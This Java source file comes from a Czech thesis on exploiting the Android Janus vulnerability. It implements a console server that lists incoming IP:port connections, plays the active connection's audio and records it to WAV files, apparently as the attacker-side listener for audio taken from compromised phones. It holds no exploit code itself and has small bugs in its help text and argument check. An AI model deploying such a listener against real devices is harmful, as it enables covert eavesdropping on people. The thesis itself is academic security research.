// Tento kod je soucast diplomove prace Vyuziti zranitelnosti Janus na operacnim systemu Android
// Autor: Bc. Vit Soucek
//
// Pouzite zdroje:
//    - zminene primo v kodu v dokumentacnich komentarich

package com.company;

import java.io.IOException;
import java.util.Scanner;

class Server {
    private static ServerThread thread;

    /**
     * Starting point of the program.
     *
     * Initialize the server thread, show help
     * and then scan for and interpret users input.
     *
     * @param args One argument -- maximum allowed memory size for pre-recording the audio
     * @throws IOException in case something went wrong with file output streams
     */
    public static void main(String[] args) throws IOException {

        int maxMemorySize = 1000; // in MB

        if(args.length > 1) {
            int arg = Integer.parseInt(args[0]);
            if(arg < 1){
                throw new IllegalArgumentException("Maximum memory size must be positive");
            }
            maxMemorySize = arg;
        }

        thread = new ServerThread(maxMemorySize);
        thread.start();

        showHelp();

        Scanner input = new Scanner(System.in);

        boolean status = true;

        while (status) {
            String connectionID = "";
            System.out.print("> ");
            String option = input.next();
            switch (option) {
                case "l":
                    listConnections();
                    break;
                case "s":
                    connectionID = input.next();
                    switchToConnection(connectionID);
                    break;
                case "d":
                    connectionID = input.next();
                    removeConnection(connectionID);
                    break;
                case "q":
                    status = false;
                    thread.status = false;
                    break;
                case "r":
                    connectionID = input.next();
                    startRecording(connectionID);
                    break;
                case "c":
                    connectionID = input.next();
                    stopRecording(connectionID);
                    break;
                case "h":
                    showHelp();
                    break;
                default:
                    System.out.println("Unknown command: " + option);
            }
        }
        System.out.println("Exiting the application");
        System.exit(0);
    }

    /**
     * Stop recording the connection passed in the argument.
     *
     * If the connectionID equals to "a" or "active", replace
     * that with the active connection ID.
     *
     * @param connectionID ID of the connection to be stopped recording
     * @throws IOException in case something went wrong with the output file stream
     */
    private static void stopRecording(String connectionID) throws IOException {
        if(connectionID.equals("a") || connectionID.equals("active")){
            if(thread.activeConnection.equals("")){
                System.out.println("[-] No active connection, cannot stop recording it");
                return;
            }
            connectionID = thread.activeConnection;
        }

        if(!checkConnection(connectionID))
            return;

        Connection toStop = thread.connections.get(connectionID);
        if(toStop != null)
            toStop.stopRecording();
        else
            System.out.println("[-] Connection with this ID not found");
    }

    /**
     * Start recording a connection given in the argument.
     * If the connectionID equals to "a" or "active", replace
     * that with the active connection ID.
     *
     * @param connectionID Connection that should be recorded
     */
    private static void startRecording(String connectionID){
        if(connectionID.equals("a") || connectionID.equals("active")){
            if(thread.activeConnection.equals("")){
                System.out.println("[-] No active connection to record");
                return;
            }
            connectionID = thread.activeConnection;
        }

        if(!checkConnection(connectionID))
            return;

        Connection toRecord = thread.connections.get(connectionID);
        if(toRecord != null)
            toRecord.startRecording();
        else
            System.out.println("[-] Connection with this ID not found");
    }

    /**
     * Remove the given connection from the thread's list.
     *
     * @param connectionID Connection to be removed
     */
    private static void removeConnection(String connectionID) {
        if(connectionID.equals("a") || connectionID.equals("active"))
            connectionID = thread.activeConnection;

        if(checkConnection(connectionID)){
            thread.removeConnection(connectionID);
        }
    }

    /**
     * Check whether the given connection is in a valid format.
     *
     * Connection should always be a string looking like this:
     *     IP:port
     *
     * Apart form the format, the validity of the IP address
     * and the port number is checked as well.
     *
     * Inspired by the answer to the StackOverflow question "Validate IPv4 address in Java
     *     author of the answer: Akarshit Wal
     *     available at: https://stackoverflow.com/a/30691451/6136143
     *
     * @param connectionID Connection to be validated
     * @return True if the connection is valid, false otherwise
     */
    private static boolean checkConnection(String connectionID) {
        String[] split_conn = connectionID.split(":");

        if (split_conn.length != 2) {
            System.out.println("Connection in wrong format: " + connectionID + ". Should be: IP:port");
            return false;
        }

        String ip = split_conn[0];
        int port = Integer.parseInt(split_conn[1]);

        String pattern = "^((0|1\\d?\\d?|2[0-4]?\\d?|25[0-5]?|[3-9]\\d?)\\.){3}(0|1\\d?\\d?|2[0-4]?\\d?|25[0-5]?|[3-9]\\d?)$";
        if (!ip.matches(pattern)) {
            System.out.println("IP address is not valid: " + ip);
            return false;
        }

        if (port > 65535 || port < 0) {
            System.out.println("Invalid port number: " + port);
            return false;
        }
        return true;
    }

    /**
     * Switch the active connection of the thread to the one
     * given as an argument.
     *
     * The connection is validated first.
     * @param connectionID Connection to be marked as active
     */
    private static void switchToConnection(String connectionID) {
        if (checkConnection(connectionID)) {
            if(!thread.connections.containsKey(connectionID)){
                System.out.println("[-] The connection does not exist");
                return;
            }
            System.out.println("[-] Connection " + connectionID + " set as active. Replaced " + thread.activeConnection);
            thread.activeConnection = connectionID;
        }
    }

    /**
     * Print the whole connection list of the thread,
     * so that the user can choose which one to make active or record.
     */
    private static void listConnections() {
        System.out.println("----------------------------------------");
        System.out.println("Active connection: " + thread.activeConnection);
        System.out.println("----------------------------------------");
        System.out.println("Other connections: ");
        for(String connectionID : thread.connections.keySet()){
            if(!connectionID.equals(thread.activeConnection))
                System.out.println(" - " + connectionID);
        }
    }

    /**
     * Show the usage message.
     */
    private static void showHelp() {
        System.out.println("");
        System.out.println("USAGE:");
        System.out.println("======");
        System.out.println("l: List all available connections");
        System.out.println("   This option lists all connection that are known to the server.");
        System.out.println("   The server automatically saves a connection to the list when it");
        System.out.println("     receives some data from the connection.");
        System.out.println("");
        System.out.println("s <CONNECTION>: Switch to chosen connection");
        System.out.println("                Make this connection active -- data from this connection");
        System.out.println("                  will be played on the speaker.");
        System.out.println("                Example: s 192.168.1.100:12345");
        System.out.println("");
        System.out.println("d <CONNECTION>: Delete selected connection");
        System.out.println("                Once you receive no data from a connection, you can manually");
        System.out.println("                  remove it from the list.");
        System.out.println("                Example: r 192.168.1.100:12345");
        System.out.println("");
        System.out.println("r: Start recording the active connection");
        System.out.println("   The recording will be saved in current directory as <connection>___<timestamp>.wav");
        System.out.println("");
        System.out.println("c: Stop recording the active connection");
        System.out.println("");
        System.out.println("q: Quit this application.");
        System.out.println("");
        System.out.println("h: Show this help");
        System.out.println("");
    }
}

